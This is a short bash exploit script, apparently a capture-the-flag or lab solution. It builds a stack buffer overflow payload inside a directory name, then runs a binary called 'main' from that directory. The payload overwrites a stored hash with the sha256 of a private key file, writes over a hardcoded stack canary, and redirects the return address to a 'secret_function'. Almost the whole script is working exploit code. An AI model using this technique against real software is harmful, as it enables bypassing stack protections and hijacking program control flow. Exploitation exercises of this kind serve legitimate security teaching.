#!/bin/bash

# Get current working directory and its length
pwd=$(pwd)
pwd_len=${#pwd}

#Calculate padding length and create payload
padding=$(printf 'a%.0s' $(seq 1 $((49-pwd_len))))

payload+=$padding

#overwrite static hash with existing key's sha256sum value
payload+=$(sha256sum private_key | head -c 64)


#add padding to reach canary
payload+=$(printf 'a%.0s' {1..17})
#add canary
payload+=$(echo -ne '\xef\xbe\xaf\xde')
#add padding to reach return address
payload+=$(printf 'a%.0s' {1..12})
#add secret_function address
payload+=$(echo -ne '\xe4\x9b\x04\x08')

# Create directory with payload name
mkdir -p "$payload"

#copy main and private_key to this new directory we created
cp main "$payload"

cp private_key "$payload"

#change pwd to this new direcotry
cd "$(pwd)/$payload"
 
# Run main program and send "user" as input
chmod +x main
echo "u" | ./main

